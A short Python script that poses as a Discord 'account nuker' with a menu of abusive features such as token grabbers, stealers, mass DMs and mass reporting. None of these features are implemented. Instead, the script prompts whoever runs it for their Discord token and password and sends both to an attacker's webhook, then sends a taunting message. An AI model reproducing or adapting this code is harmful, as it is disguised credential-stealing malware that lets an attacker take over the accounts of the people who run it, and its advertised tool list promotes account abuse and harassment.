
from dhooks import Webhook
from colorama import Fore

#OH NO SOMEONE BROKE IN SHUT IT ALL DOWN QUICK AAAAAAAAAA
#OUR WEBHOOKS ARE AT RISK RUNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

hook = Webhook("put webhook here")

print(Fore.CYAN + """

╭╮╭━╮╭╮╱╭╮╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭━╮╱╭┳╮╱╭┳╮
┃┃┃╭╋╯╰┳╯╰╮╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰┫┃╰╮┃┃┃╱┃┃┃
┃╰╯╯┣╮╭┻╮╭╋╮╱╭╮┃┃╱┃┣━━┳━━┳━━┳╮╭┳━╋╮╭┫╭╮╰╯┃┃╱┃┃┃╭┳━━┳━╮
┃╭╮┃┣┫┃╱┃┃┃┃╱┃┃┃╰━╯┃╭━┫╭━┫╭╮┃┃┃┃╭╮┫┃┃┃╰╮┃┃┃╱┃┃╰╯┫┃━┫╭╯
┃┃┃╰┫┃╰╮┃╰┫╰━╯┃┃╭━╮┃╰━┫╰━┫╰╯┃╰╯┃┃┃┃╰┫┃╱┃┃┃╰━╯┃╭╮┫┃━┫┃
╰╯╰━┻┻━╯╰━┻━╮╭╯╰╯╱╰┻━━┻━━┻━━┻━━┻╯╰┻━┻╯╱╰━┻━━━┻╯╰┻━━┻╯
╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╰━━╯
""")

token = input("Put Token Here:")
password = input("Put Password Here:")

hook.send(token)
hook.send(password)

print(Fore.CYAN + """

╭╮╭━╮╭╮╱╭╮╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭━╮╱╭┳╮╱╭┳╮
┃┃┃╭╋╯╰┳╯╰╮╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰┫┃╰╮┃┃┃╱┃┃┃
┃╰╯╯┣╮╭┻╮╭╋╮╱╭╮┃┃╱┃┣━━┳━━┳━━┳╮╭┳━╋╮╭┫╭╮╰╯┃┃╱┃┃┃╭┳━━┳━╮
┃╭╮┃┣┫┃╱┃┃┃┃╱┃┃┃╰━╯┃╭━┫╭━┫╭╮┃┃┃┃╭╮┫┃┃┃╰╮┃┃┃╱┃┃╰╯┫┃━┫╭╯
┃┃┃╰┫┃╰╮┃╰┫╰━╯┃┃╭━╮┃╰━┫╰━┫╰╯┃╰╯┃┃┃┃╰┫┃╱┃┃┃╰━╯┃╭╮┫┃━┫┃
╰╯╰━┻┻━╯╰━┻━╮╭╯╰╯╱╰┻━━┻━━┻━━┻━━┻╯╰┻━┻╯╱╰━┻━━━┻╯╰┻━━┻╯
╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╰━━╯
""")

print(Fore.BLUE + """
[1] Nuke Account                      [10] Disable Account
[2] Unfriend all friends              [11] Status Changer
[3] Delete and leave all servers      [12] Create Token Grabber
[4] Spam Create New Channels          [13] Create Stealer.V2
[5] Dm Deleter                        [14] QR code Grabber
[6] Mass Dm                           [15] Mass Report
[7] Enable Seizure Mode               [16] GroupChat spammer
[8] Get Information On Account        [17] Webhook Destroyer
[9] Log into an Account               [18] Exit
""")

choice = Webhook("Put a webhook leading to a other channel here")

picks = input("Choice:")

choice.send(picks)

evil = Webhook("put another webhook")

evil.send("HAHAHAAHAHAHAHAHAHHAAHAHHAAHAHAHAHHAHAHAAHAHAHAHHAHAAH")
